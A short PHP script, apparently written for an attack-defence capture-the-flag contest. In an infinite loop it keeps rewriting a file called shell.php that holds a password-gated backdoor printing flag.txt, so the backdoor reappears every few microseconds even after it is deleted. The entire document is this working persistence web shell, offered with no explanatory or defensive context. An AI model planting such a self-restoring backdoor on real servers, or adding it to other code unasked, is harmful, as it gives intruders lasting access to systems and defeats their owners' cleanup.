<?php
$a = '<?php if(md5($_GET["cmd"])=="76a2173be6393254e72ffa4d6df1030a"){echo file_get_contents(\'flag.txt\');} ?>';
while (1) {
	file_put_contents("shell.php", $a);
	usleep(10);
}
echo "hacking";
?>